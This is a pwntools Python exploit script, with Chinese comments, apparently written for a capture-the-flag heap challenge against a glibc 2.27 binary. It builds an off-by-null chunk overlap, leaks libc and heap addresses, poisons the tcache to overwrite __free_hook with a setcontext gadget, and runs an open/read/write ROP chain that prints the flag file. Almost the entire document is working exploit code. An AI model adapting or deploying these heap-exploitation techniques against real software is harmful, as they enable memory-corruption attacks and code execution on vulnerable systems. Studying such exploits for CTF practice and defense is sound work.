#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./OBN27-16')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./OBN27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

for i in range(7):
	add(0xf8)

add(0xf8) #7 0x950
add(0x88) #8 0xa50
add(0xf8) #9 0xae0
add(0x100) #10 0xbe0

#填满 tcachebin
for i in range(7):
	delete(i)

delete(7) # 放入 unsortedbin
delete(8) # 放入 tcachebin

add(0x88) #11 0xa50 use chunk8, off by null，修改 chunk9 的 size 位
edit(11, 'A'*0x80+p64(0x190))
delete(9) #向上合并堆块
#这样就控制了 chunk11,8

#分割unsortedbin
add(0x70) #12 0x950
add(0x70) #13 0x9d0

show(11)
libcbase = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3ebca0
setcontext_door = libcbase + libc.sym['setcontext'] + 53
free_hook = libcbase + libc.sym['__free_hook']
bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2625 # syscall ; ret
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret
ret = prdi_ret + 1 # ret
pr('libcbase',libcbase)

add(0x100) #14 0xa50
delete(10)
delete(14)

show(11)
heapbase = u64(p.recv(6).ljust(8, "\x00")) - 0xbf0
pr('heapbase',heapbase)

flag_addr = heapbase + 0xb38
#open
payload  = p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)
#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)
#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)
payload += './flag\x00\x00'

edit(11, p64(free_hook))
add(0x100) #15 0xa50
add(0x100) #16 分配至free_hook
edit(16, p64(setcontext_door)) #把 setcontext_door 写入 free_hook

edit(15, payload)
edit(13, p64(0)*4+p64(heapbase + 0xa60)+p64(ret))

#gdb.attach(p)
#pause()

delete(12) #0x950
p.interactive()